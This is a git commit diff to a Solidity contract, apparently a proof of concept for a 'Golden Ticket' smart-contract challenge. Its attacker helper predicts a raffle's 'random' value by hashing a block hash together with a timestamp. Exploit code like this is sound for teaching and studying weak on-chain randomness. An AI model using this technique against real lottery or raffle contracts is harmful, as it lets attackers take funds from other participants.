b51700609a790687297cf05858e0f703fe9bccde
AlanRacciatti <alanracciatti1220@gmail.com>
2023-01-16 09:13:23 -0300

    feat: completed PoC

--- contracts/GoldenTicketAttacker.sol
+++ contracts/GoldenTicketAttacker.sol
@@ -4,13 +4,11 @@ pragma solidity 0.8.17;
 /// @title The Golden Ticket Attacker
 /// @author https://twitter.com/AlanRacciatti
 contract GoldenTicketAttacker {
-    function getRaffleInput(uint256 _blockNumber, uint256 _timestamp)
+    function getRaffleInput(bytes32 _blockhash, uint256 _timestamp)
         external
-        view
+        pure
         returns (uint256 _guess)
     {
-        _guess = uint256(
-            keccak256(abi.encodePacked(blockhash(_blockNumber), _timestamp))
-        );
+        _guess = uint256(keccak256(abi.encodePacked(_blockhash, _timestamp)));
     }
 }
